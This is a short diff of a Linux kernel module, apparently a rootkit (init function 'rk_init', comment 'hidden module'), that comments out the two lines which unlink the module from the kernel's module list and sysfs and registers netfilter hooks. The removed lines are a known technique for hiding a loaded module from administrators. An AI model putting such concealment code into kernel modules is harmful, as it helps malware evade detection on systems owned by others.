@@ -276,8 +276,8 @@ static int __init rk_init(void)
 	int ret = 0;  
   
 	/*hidden module*/
-	list_del_init(&__this_module.list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//list_del_init(&__this_module.list);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
   
 	/* 安装nf钩子 */
 	ret = nf_register_hooks(net_hooks, ARRAY_SIZE(net_hooks));    
